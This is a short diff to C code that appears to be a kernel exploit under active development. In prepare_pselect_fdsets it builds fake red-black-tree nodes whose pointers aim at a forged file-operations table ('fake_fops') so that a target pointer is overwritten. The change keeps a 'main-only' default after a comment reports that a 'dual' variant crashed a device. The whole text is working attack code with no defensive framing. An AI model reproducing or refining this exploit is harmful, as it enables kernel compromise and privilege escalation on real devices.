@@ -442,11 +442,17 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                     "prio=200 (*MISC=fake_fops; rb-leaf fops shell)\n",
                     (unsigned long long)tree_pc, (unsigned long long)fake_fops);
           } else {
+            /*
+             * only-left: parent=value, left=target. Aristotle source dual-stamps
+             * main+pi; on CPH dual_pi SOFTBOOTS even on quiet boot_id (2026-08-16
+             * fire). Keep main-only default; MODE4_ARISTOTLE_DUAL=1 to probe.
+             */
             uint64_t parent_pc = (uint64_t)fake_fops;
+            int dual = env_flag("MODE4_ARISTOTLE_DUAL", 0);
             tree_pc = parent_pc;
             tree_r = 0;
             tree_l = tgt;
-            if (env_flag("MODE4_ARISTOTLE_DUAL", 0)) {
+            if (dual) {
               pi_parent = parent_pc;
               pi_right = 0;
               pi_left = tgt;
@@ -460,9 +466,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
             stack_deadline = 0;
             pr_info("stack mode4 ARISTOTLE only-left parent=fake_fops=%016llx "
                     "right=0 left(tgt)=%016llx prio=3 dual_pi=%d "
-                    "(*tgt=fake_fops)\n",
-                    (unsigned long long)parent_pc, (unsigned long long)tgt,
-                    env_flag("MODE4_ARISTOTLE_DUAL", 0));
+                    "(*tgt=fake_fops; main-only default on CPH)\n",
+                    (unsigned long long)parent_pc, (unsigned long long)tgt, dual);
           }
         } else if (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 1) {
           /*
